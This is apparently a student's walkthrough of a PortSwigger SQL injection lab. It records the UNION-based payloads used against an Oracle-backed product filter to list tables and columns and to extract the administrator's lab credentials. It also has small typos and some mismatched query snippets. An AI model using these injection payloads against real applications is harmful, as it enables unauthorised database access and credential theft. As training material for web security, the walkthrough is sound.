# Lab: SQL Injection Attack 

- sqli: product category fillter
- end goal:  log in as the administrator user

### Analysis
- url: `https://0ab4004003e41eed88c2ed560098006d.web-security-academy.net/`

- front-end: `/filter?category=Pets`
- back-end:
```sql
select * from product where category = 'Pets' ans released = 1
```

- check sqli vulnerability
- front-end: `/filter?category=Pets'`
- back-end:
```sql
select * from product where category = 'Pets'' ans released = 1
'-- 500 Internal Server Error 
```

- front-end: `/filter?category=Pets'--`
- back-end:
```sql
select * from product where category = 'Pets'--' ans released = 1
-- 200 OK: oracle database
```

- determine how many columns 
- front-end: `/filter?category=Pets' order by2--`
- back-end:
```sql
select * from product where category = 'Pets' order by 2--' ans released = 1
-- 200 OK: contain 2 columns
```

- determine data type of the columns 
- front-end: `/filter?category=Pets' union select 'a', 'a' from dual--`
- back-end:
```sql
select * from product where category = 'Pets'' union select 'a', 'a' from dual-- ans released = 1
'-- 200 OK: both columns are text
```

- display the database version 
- front-end: `/filter?category=Pets' union select banner, null from v$version--`
- back-end:
```sql
select * from product where category = 'Pets'' union select banner, null from v$version-- ans released = 1
'-- 200 OK: Oracle Database 11.2.0.2.0
```

- output the list of tables in the database
- front-end: `/filter?category=Pets' union select table_name, null from all_tables--`
- back-end:
```sql
select * from product where category = 'Pets'' union select table_name, null from all_tables--
'-- 200 OK: table name: USERS_BMPJSO
```

- output the columns of the users table
- front-end: `/filter?category=Pets' union select column_name, null from all_tab_columns where table_name= 'USERS_BMPJSO'--`
- back-end:
```sql
select * from product where category = 'Pets'' union select table_name, null from all_tables--
'-- 200 OK: column name: USERNAME_XTEEQM
-- column name: PASSWORD_CGTCHV  
```

- output usernames and passwords
- front-end: `/filter?category=Pets' union select USERNAME_XTEEQM, PASSWORD_CGTCHV from USERS_BMPJSO--`
- back-end:
```sql
select * from product where category = 'Pets'' union select USERNAME_XTEEQM, PASSWORD_CGTCHV from USERS_BMPJSO--
'-- 200 OK: username: administrator
-- password: fliavnpnhzwifdrtgvht  
```
- login as administrator account
- Congratulations, you solved the lab!

---

**SQL Lab:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
